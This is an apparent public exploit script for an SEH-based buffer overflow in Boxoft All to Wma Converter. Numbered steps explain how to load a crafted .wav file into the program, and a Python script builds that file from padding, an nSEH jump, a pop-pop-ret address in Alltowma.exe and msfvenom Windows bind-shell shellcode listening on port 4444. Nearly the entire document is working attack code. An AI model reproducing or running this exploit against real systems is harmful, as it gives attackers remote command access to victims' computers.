#Steps to exploit



# 1. Run python script to generate the ".wav" file

# 2. Open Alltowma.exe(Boxoft All to Wma Converter) file

# 3. Press "Try" button

# 4. Select batch conversion mode option and press next

# 5. Press "add" button and select the ".wav" file generated by the python script

# then you will have a bind shell on port 4444



#code



#!/usr/bin/env python

#--coding: utf-8--



#msfvenom -p windows/shell_bind_tcp -f py -b '\x00\x0a\x0d\x20' -v shellcode

shellcode =  b""

shellcode += b"\xdb\xc1\xb8\x59\x18\xa1\xe7\xd9\x74\x24\xf4"

shellcode += b"\x5a\x31\xc9\xb1\x53\x31\x42\x17\x03\x42\x17"

shellcode += b"\x83\x9b\x1c\x43\x12\xe7\xf5\x01\xdd\x17\x06"

shellcode += b"\x66\x57\xf2\x37\xa6\x03\x77\x67\x16\x47\xd5"

shellcode += b"\x84\xdd\x05\xcd\x1f\x93\x81\xe2\xa8\x1e\xf4"

shellcode += b"\xcd\x29\x32\xc4\x4c\xaa\x49\x19\xae\x93\x81"

shellcode += b"\x6c\xaf\xd4\xfc\x9d\xfd\x8d\x8b\x30\x11\xb9"

shellcode += b"\xc6\x88\x9a\xf1\xc7\x88\x7f\x41\xe9\xb9\x2e"

shellcode += b"\xd9\xb0\x19\xd1\x0e\xc9\x13\xc9\x53\xf4\xea"

shellcode += b"\x62\xa7\x82\xec\xa2\xf9\x6b\x42\x8b\x35\x9e"

shellcode += b"\x9a\xcc\xf2\x41\xe9\x24\x01\xff\xea\xf3\x7b"

shellcode += b"\xdb\x7f\xe7\xdc\xa8\xd8\xc3\xdd\x7d\xbe\x80"

shellcode += b"\xd2\xca\xb4\xce\xf6\xcd\x19\x65\x02\x45\x9c"

shellcode += b"\xa9\x82\x1d\xbb\x6d\xce\xc6\xa2\x34\xaa\xa9"

shellcode += b"\xdb\x26\x15\x15\x7e\x2d\xb8\x42\xf3\x6c\xd5"

shellcode += b"\xa7\x3e\x8e\x25\xa0\x49\xfd\x17\x6f\xe2\x69"

shellcode += b"\x14\xf8\x2c\x6e\x5b\xd3\x89\xe0\xa2\xdc\xe9"

shellcode += b"\x29\x61\x88\xb9\x41\x40\xb1\x51\x91\x6d\x64"

shellcode += b"\xcf\x99\xc8\xd7\xf2\x64\xaa\x87\xb2\xc6\x43"

shellcode += b"\xc2\x3c\x39\x73\xed\x96\x52\x1c\x10\x19\x4d"

shellcode += b"\x81\x9d\xff\x07\x29\xc8\xa8\xbf\x8b\x2f\x61"

shellcode += b"\x58\xf3\x05\xd9\xce\xbc\x4f\xde\xf1\x3c\x5a"

shellcode += b"\x48\x65\xb7\x89\x4c\x94\xc8\x87\xe4\xc1\x5f"

shellcode += b"\x5d\x65\xa0\xfe\x62\xac\x52\x62\xf0\x2b\xa2"

shellcode += b"\xed\xe9\xe3\xf5\xba\xdc\xfd\x93\x56\x46\x54"

shellcode += b"\x81\xaa\x1e\x9f\x01\x71\xe3\x1e\x88\xf4\x5f"

shellcode += b"\x05\x9a\xc0\x60\x01\xce\x9c\x36\xdf\xb8\x5a"

shellcode += b"\xe1\x91\x12\x35\x5e\x78\xf2\xc0\xac\xbb\x84"

shellcode += b"\xcc\xf8\x4d\x68\x7c\x55\x08\x97\xb1\x31\x9c"

shellcode += b"\xe0\xaf\xa1\x63\x3b\x74\xd1\x29\x61\xdd\x7a"

shellcode += b"\xf4\xf0\x5f\xe7\x07\x2f\xa3\x1e\x84\xc5\x5c"

shellcode += b"\xe5\x94\xac\x59\xa1\x12\x5d\x10\xba\xf6\x61"

shellcode += b"\x87\xbb\xd2"



nSEH = "\xeb\x06\x90\x90" #jmp short 6

SEH = "\x3f\xd6\x5e\x00"  #pop ecx # pop ebp # ret 0x04 Alltowma.exe

buffer = "\x41" * 4132 + nSEH + SEH + "\x90" * 12 + shellcode

f = open("exploit.wav", "w")

f.write(buffer)

f.close()


